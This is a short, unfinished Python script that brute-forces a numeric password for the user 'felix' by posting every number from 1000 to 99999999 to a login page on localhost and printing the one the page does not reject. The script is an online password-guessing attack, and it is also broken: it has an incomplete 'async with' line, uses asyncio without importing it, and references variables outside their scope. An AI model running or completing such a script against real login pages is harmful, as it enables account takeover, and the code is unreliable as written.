#TODO add async! 
import random
import string
import requests
import time
sess = requests.session()
digits = {
        1000 : 9999,
        10000 : 99999,
        100000 : 999999,
        1000000 : 9999999,
        10000000 : 99999999
        }

async def brute(passwd, session):
    async with 
    #...
    passwd = str(i)
    creds = {'user' : 'felix', 'password' : passwd}
    req = sess.post('http://localhost:8080/login.php', data = creds)
    
    

loops = asyncio.get_event_loop()
tasks = []

async def main():
    for low, high in digits.items():
        start = time.time()
        for i in range(low, high):
            if 'Wrong' in req.text:
                continue
            else:
                print("password: {0} time: {1}".format(passwd, time.time() - start))
            print("yay! Password: ", passwd)
if __name__ == "__main__":
    main()

